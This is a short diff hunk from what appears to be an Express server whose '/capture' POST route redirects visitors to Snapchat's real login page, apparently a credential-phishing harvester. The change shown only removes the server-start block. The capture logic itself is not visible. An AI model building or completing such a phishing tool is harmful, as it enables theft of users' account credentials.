@@ -47,8 +47,3 @@ app.post('/capture', (req, res) => {
     res.redirect('https://accounts.snapchat.com/v2/login');
 });
 
-// Start Server
-app.listen(PORT, () => {
-    console.log(`Server is listening on port ${PORT}`);
-    console.log(`Local URL: http://localhost:${PORT}`);
-});
